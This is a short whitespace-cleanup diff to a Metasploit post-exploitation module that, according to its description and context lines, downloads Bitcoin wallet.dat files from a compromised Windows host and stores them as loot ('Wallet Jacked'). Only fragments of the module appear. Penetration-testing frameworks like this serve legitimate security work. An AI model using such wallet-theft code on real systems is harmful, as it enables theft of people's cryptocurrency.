@@ -18,7 +18,7 @@ class Metasploit3 < Msf::Post
 	def initialize(info={})
 		super( update_info( info,
 				'Name'          => 'Windows Gather Bitcoin wallet.dat',
-				'Description'   => %q{ 
+				'Description'   => %q{
 					This module downloads any Bitcoin wallet.dat files from the target system
 				},
 				'License'       => MSF_LICENSE,
@@ -57,7 +57,7 @@ class Metasploit3 < Msf::Post
 			
 			store_loot("bitcoin.wallet", "application/octet-stream", session, data, filename, "Bitcoin Wallet")
 			print_status("     Wallet Jacked.")
-		rescue ::Interrupt 
+		rescue ::Interrupt
 			raise $!
 		rescue ::Exception => e
 			print_error("Failed to download #{filename}: #{e.class} #{e}")	
